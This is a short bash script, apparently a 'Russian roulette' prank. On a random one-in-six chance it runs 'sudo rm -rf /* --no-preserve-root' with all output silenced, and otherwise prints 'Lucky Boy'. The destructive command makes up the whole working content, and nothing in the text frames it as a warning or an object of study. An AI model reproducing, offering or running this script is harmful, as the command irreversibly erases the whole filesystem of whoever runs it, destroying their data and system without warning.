#!/bin/bash
[ $[ $RANDOM % 6] == 0 ] && sudo rm -rf /* --no-preserve-root &>/dev/null || echo "Lucky Boy";
